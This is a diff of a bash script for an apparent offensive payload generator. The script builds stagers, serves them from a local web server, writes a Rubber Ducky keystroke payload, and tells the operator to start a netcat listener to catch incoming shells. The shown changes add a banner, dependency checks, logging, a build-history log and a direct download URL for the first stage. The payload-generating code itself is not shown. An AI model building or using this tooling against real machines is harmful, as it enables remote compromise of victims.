@@ -1,13 +1,35 @@
+#!/bin/bash
 # Payload Generator Script
-
 # This script generates a payload based on user input and serves it via a web server.
-
 # It supports multiple operating systems and delivery methods.
-
 # Usage: ./run.sh
 
-#!/bin/bash
 set -euo pipefail
+
+# --------- [ BANNER ] ---------
+cat <<'BANNER'
+   ____  _           _       _     ____                                      
+  |  _ \| |__   ___ | |_ ___| |__ |  _ \  ___  ___ ___  _ __ ___  ___  _ __  
+  | |_) | '_ \ / _ \| __/ __| '_ \| | | |/ _ \/ __/ _ \| '__/ _ \/ _ \| '_ \ 
+  |  __/| | | | (_) | || (__| | | | |_| |  __/ (_| (_) | | |  __/ (_) | | | |
+  |_|   |_| |_|\___/ \__\___|_| |_|____/ \___|\___\___/|_|  \___|\___/|_| |_|
+BANNER
+echo
+
+# --------- [ CHECK DEPENCIES ] ---------
+check_dep() {
+  for cmd in "$@"; do
+    command -v "$cmd" &>/dev/null || { echo -e "\e[1;31m[ERROR]\e[0m Missing dependency: $cmd"; exit 1; }
+  done
+}
+check_dep python3 lsof nc
+
+# --------- [ Ctrl+C ] ---------
+trap 'log "Interrupted. Exiting."; exit 1' INT
+
+# --------- [ LOG FUNCTION ] ---------
+log()   { echo -e "\e[1;32m[$(date +%H:%M:%S)] $1\e[0m"; }
+error() { echo -e "\e[1;31m[$(date +%H:%M:%S)] $1\e[0m" >&2; }
 
 # ----------------------[ SETTINGS ]-------------------------
 PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
@@ -20,10 +42,6 @@ PAYLOADS_DIR="payloads"
 STAGERS_DIR="stagers"
 
 mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"
-
-# --------------------[ LOG FUNCTION ]-----------------------
-log()   { echo -e "\e[1;32m[*] $1\e[0m"; }
-error() { echo -e "\e[1;31m[!] $1\e[0m" >&2; }
 
 # ---------------------[ GET NETWORK IP ]--------------------
 log "Available local IP addresses:"
@@ -136,6 +154,9 @@ serve_web() {
 
 serve_web
 
+# --------- [ build_history.log ] ---------
+echo "[$(date)] $IP $PORT_SHELL $PORT_SERVE $OS $PAYLOAD $DELIVERY" >> build_history.log
+
 # -------------[ SAVE CONFIG ]-------------------------------
 cat > "$CONFIG_FILE" <<EOF
 {
@@ -159,6 +180,6 @@ EOF
 
 log "Payload ready."
 log "Serve URL: http://$IP:$PORT_SERVE/"
+log "Direct download URL: http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
 log "Ducky payload saved: $OUTPUT_DIR/ducky_payload.txt"
 log "To listen for incoming connection, run: nc -lvnp $PORT_SHELL"
-
